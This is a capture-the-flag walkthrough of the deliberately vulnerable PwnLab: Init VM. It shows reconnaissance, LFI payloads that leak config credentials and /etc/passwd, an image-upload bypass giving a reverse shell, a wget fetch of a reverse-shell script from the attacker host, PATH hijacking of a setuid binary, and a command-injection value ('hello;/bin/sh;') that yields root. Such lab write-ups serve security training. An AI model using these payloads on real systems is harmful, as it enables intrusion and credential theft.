# Pwnlab: Init | VulnHub
https://www.vulnhub.com/entry/pwnlab-init,158/

### 1. Scan
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo nmap -A -p- -T4 192.168.34.151
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-12 19:42 EST
Nmap scan report for 192.168.34.151
Host is up (0.0011s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: PwnLab Intranet Image Hosting
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          41014/tcp6  status
|   100024  1          43002/udp   status
|   100024  1          43588/udp6  status
|_  100024  1          52556/tcp   status
3306/tcp  open  mysql   MySQL 5.5.47-0+deb8u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.47-0+deb8u1
|   Thread ID: 38
|   Capabilities flags: 63487
|   Some Capabilities: IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, Support41Auth, DontAllowDatabaseTableColumn, LongColumnFlag, Speaks41ProtocolOld, SupportsTransactions, Speaks41ProtocolNew, SupportsLoadDataLocal, SupportsCompression, InteractiveClient, LongPassword, ODBCClient, FoundRows, ConnectWithDatabase, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: Yvcm{D~o2K_~|sK]p?&@
|_  Auth Plugin Name: mysql_native_password
52556/tcp open  status  1 (RPC #100024)
MAC Address: 00:0C:29:DC:E8:CE (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   1.05 ms 192.168.34.151

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.36 seconds
```
The machine is running an Apache HTTP server, RPC and MySQL.

### 2. Enumeration
The website which is being hosted by Apache is PHP and allows for file uploads, but you need to be logged in. A quick check shows that /upload is listable.
Since MySQL returned a bit more info than usual in nmap, some further probing is warrented:
```bash
┌──(kali㉿kali)-[~/Extra_Tools/dirsearch]
└─$ nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 192.168.34.151 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-12 19:55 EST
Nmap scan report for 192.168.34.151
Host is up (0.00057s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.47-0+deb8u1
| mysql-enum: 
|   Valid usernames: 
|     root:<empty> - Valid credentials
|     netadmin:<empty> - Valid credentials
|     guest:<empty> - Valid credentials
|     user:<empty> - Valid credentials
|     web:<empty> - Valid credentials
|     sysadmin:<empty> - Valid credentials
|     administrator:<empty> - Valid credentials
|     webadmin:<empty> - Valid credentials
|     admin:<empty> - Valid credentials
|     test:<empty> - Valid credentials
|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.47-0+deb8u1
|   Thread ID: 64
|   Capabilities flags: 63487
|   Some Capabilities: Support41Auth, ConnectWithDatabase, Speaks41ProtocolOld, SupportsTransactions, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, DontAllowDatabaseTableColumn, LongColumnFlag, FoundRows, Speaks41ProtocolNew, InteractiveClient, SupportsCompression, ODBCClient, LongPassword, SupportsLoadDataLocal, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: lO&ny6?w\H2`o.4YE,M|
|_  Auth Plugin Name: mysql_native_password

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.84 seconds
```
Although there is some more info here, none of it appears useful for now.  
Looking at the various parameters being passed to the server, the most obvious one to start with is injecting into the login fields, but nothing works here. There are also no obvious username:password pairings. The only other parameter is "page", which is being used to determine what page to load content from. "page=upload" refers to upload.php, which exists, and so on. To find other existing pages I can do a quick dirbust:
```bash
┌──(kali㉿kali)-[~/Extra_Tools/dirsearch]
└─$ python3 dirsearch.py -u http://192.168.34.151 -x 403
  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )                                                                                                                                                                           
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10848

Error Log: /home/kali/Extra_Tools/dirsearch/logs/errors-21-03-12_20-22-56.log

Target: http://192.168.34.151/
Output File: /home/kali/Extra_Tools/dirsearch/reports/192.168.34.151/_21-03-12_20-22-56.txt

[20:22:56] Starting: 
[20:23:11] 200 -    0B  - /config.php
[20:23:15] 200 -  943B  - /images/
[20:23:15] 301 -  317B  - /images  ->  http://192.168.34.151/images/
[20:23:16] 200 -  332B  - /index.php          
[20:23:16] 200 -  332B  - /index.php/login/
[20:23:17] 200 -  250B  - /login.php
[20:23:26] 301 -  317B  - /upload  ->  http://192.168.34.151/upload/
[20:23:26] 200 -   19B  - /upload.php 
[20:23:26] 200 -  743B  - /upload/
Task Completed
```
  
### 3. Exploit LFI
From here, try a bunch of LFI techniques on the page parameter until I have some success with php filtering. Using `page=php://filter/convert.iconv.utf-8.utf-16/resource=config`, I can get the contents of the php file returned:
```php
<?php
$server   = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?>
```
The database creds were found: `root:H4u%QJ_H99`.  
Additionally the index page describes some language functionality that isn't implemented yet:
```php
<?php

//Multilingual. Not implemented yet.

//setcookie("lang","en.lang.php");

if (isset($_COOKIE['lang']))

{

  include("lang/".$_COOKIE['lang']);

}

// Not implemented yet.

?>
```
This is potentially another LFI vuln, which I can test out. This one is better because it allows me to access any file that Apache's user can. Supplying the cookie as `lang=../../../../../etc/passwd` gets me the passwd file.

### 4. Access the MySQL database
The MySQL database is accessable remotely, and from here I can view users and their passwords.
```bash
┌──(kali㉿kali)-[~]
└─$ mysql -u root -h 192.168.34.151 -p                                                                                                                                                                                                                                              9 ⨯
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 37
Server version: 5.5.47-0+deb8u1 (Debian)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| Users              |
+--------------------+
2 rows in set (0.006 sec)

MySQL [(none)]> use Users; show tables;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
+-----------------+
| Tables_in_Users |
+-----------------+
| users           |
+-----------------+
1 row in set (0.001 sec)

MySQL [Users]> select * from users;
+------+------------------+
| user | pass             |
+------+------------------+
| kent | Sld6WHVCSkpOeQ== |
| mike | U0lmZHNURW42SQ== |
| kane | aVN2NVltMkdSbw== |
+------+------------------+
3 rows in set (0.007 sec)
```
Decode the passwords:
```bash
┌──(kali㉿kali)-[~]
└─$ echo "Sld6WHVCSkpOeQ==" | base64 -d                                                                                                                  
JWzXuBJJNy                                                                                                                                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ echo "U0lmZHNURW42SQ==" | base64 -d
SIfdsTEn6I                                                                                                                                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ echo "aVN2NVltMkdSbw==" | base64 -d
iSv5Ym2GRo 
```

### 5. Access the upload page
From here I can login as a user and upload files. Before doing so I'll check the content of the upload.php page:
```php
<?php
session_start();
if (!isset($_SESSION['user'])) { die('You must be log in.'); }
?>
<html>
        <body>
                <form action='' method='post' enctype='multipart/form-data'>
                        <input type='file' name='file' id='file' />
                        <input type='submit' name='submit' value='Upload'/>
                </form>
        </body>
</html>
<?php 
if(isset($_POST['submit'])) {
        if ($_FILES['file']['error'] <= 0) {
                $filename  = $_FILES['file']['name'];
                $filetype  = $_FILES['file']['type'];
                $uploaddir = 'upload/';
                $file_ext  = strrchr($filename, '.');
                $imageinfo = getimagesize($_FILES['file']['tmp_name']);
                $whitelist = array(".jpg",".jpeg",".gif",".png"); 

                if (!(in_array($file_ext, $whitelist))) {
                        die('Not allowed extension, please upload images only.');
                }

                if(strpos($filetype,'image') === false) {
                        die('Error 001');
                }

                if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {
                        die('Error 002');
                }

                if(substr_count($filetype, '/')>1){
                        die('Error 003');
                }

                $uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;

                if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
                        echo "<img src=\"".$uploadfile."\"><br />";
                } else {
                        die('Error 4');
                }
        }
}

?>
```

### 6. Get a shell

It looks like the application does both MIME and extension checks. This means I will need to make sure my uploaded file has both an image file extension as well as the right mimetype. I can add the `GIF89a;` header to the front of a file and try to upload it, which succeeds. I can't execute my PHP code through the browser, but the other lang cookie LFI vuln allows me to access the file and include it in the page, triggering the shell.  
The lang cookie that works for me is: `lang=../../../../../../../var/www/html/upload/0c911ccc17139953d356270504bbf42c.jpg`
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -lvnp 9999                   
listening on [any] 9999 ...
connect to [192.168.34.141] from (UNKNOWN) [192.168.34.151] 59628
Linux pwnlab 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29) i686 GNU/Linux
 21:32:58 up 57 min,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

### 7. Enumeration
Each account which was in the users table has an account on the machine. From /etc/passwd:
```bash
john:x:1000:1000:,,,:/home/john:/bin/bash
kent:x:1001:1001:,,,:/home/kent:/bin/bash
mike:x:1002:1002:,,,:/home/mike:/bin/bash
kane:x:1003:1003:,,,:/home/kane:/bin/bash
```
It turns out both Kent and Kane are reusing their passwords.
```bash
www-data@pwnlab:/var/www/html$ su - kent 
Password: JWzXuBJJNy

kent@pwnlab:~$ id
uid=1001(kent) gid=1001(kent) groups=1001(kent)

kent@pwnlab:~$ su - mike
Password: SIfdsTEn6I
su: Authentication failure

kent@pwnlab:~$ su - kane
Password: iSv5Ym2GRo

kane@pwnlab:~$ id
uid=1003(kane) gid=1003(kane) groups=1003(kane)
```
In Kane's home folder, he has a setuid binary called "msgmike" which when ran, tries to access "mike.txt" in Mike's home folder as Mike.
```bash
kane@pwnlab:~$ ls -l msgmike
ls -l msgmike
-rwsr-sr-x 1 mike mike 5148 Mar 17  2016 msgmike
kane@pwnlab:~$ ./msgmike
./msgmike
cat: /home/mike/msg.txt: No such file or directory
```
I can run strings on the file to see how the command is called:
```bash
kane@pwnlab:~$ strings msgmike
...
setreuid
system
__libc_start_main
__gmon_start__
GLIBC_2.0
PTRh 
QVh[
[^_]
cat /home/mike/msg.txt
;*2$"(
GCC: (Debian 4.9.2-10) 4.9.2
GCC: (Debian 4.8.4-1) 4.8.4
...
```
I can see cat is being called by referring to it's location in the PATH variable. I should be able to change this to run code as Mike.

### 8. Lateral movement
Firstly I create a python file that will connect back to me and give me a reverse shell. I call it "cat". Download it to the target inside /tmp, change the PATH variable to check /tmp first, then run the msgmike program. 
```bash
kane@pwnlab:/tmp$ wget http://192.168.34.141:8000/cat
--2021-03-12 22:55:07--  http://192.168.34.141:8000/cat
Connecting to 192.168.34.141:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 249 [application/octet-stream]
Saving to: ‘cat’

cat                 100%[=====================>]     249  --.-KB/s   in 0s     

2021-03-12 22:55:07 (28.2 MB/s) - ‘cat’ saved [249/249]

kane@pwnlab:/tmp$ chmod +x cat
kane@pwnlab:/tmp$ export PATH=/tmp/:$PATH
kane@pwnlab:/tmp$ echo $PATH
/tmp/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
kane@pwnlab:/tmp$ cd ~/
kane@pwnlab:~$ ./msgmike
./msgmike
```
The binary executes my custom "cat" script and connects back to me.
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -lvnp 9998           
listening on [any] 9998 ...
connect to [192.168.34.141] from (UNKNOWN) [192.168.34.151] 54458
$ id  
uid=1002(mike) gid=1002(mike) groups=1002(mike),1003(kane)
```

### 9. Enumerate from new user
Mike also has a setuid binary in their home, this one is for root.
```bash
mike@pwnlab:/home/mike$ ls -l
total 8
-rwsr-sr-x 1 root root 5364 Mar 17  2016 msg2root

mike@pwnlab:/home/mike$ strings msg2root
...
GLIBC_2.0
PTRh
[^_]
Message for root: 
/bin/echo %s >> /root/messages.txt
;*2$"(
...
```
Here we can see the binary is taking user input when ran and echoing it into a file called messages.txt in the root folder. This time it is using a static path for echo, so the previous technique won't work. But I should be able to inject into the command and still get some execution.

### 10. Escalate to root
I can inject into the root message, making a call to /bin/sh to get a shell. It needs to be sh as bash will drop the privileges.
```bash
mike@pwnlab:/home/mike$ ./msg2root
./msg2root
Message for root: hello;/bin/sh;
hello;/bin/sh;
hello
# whoami
root
```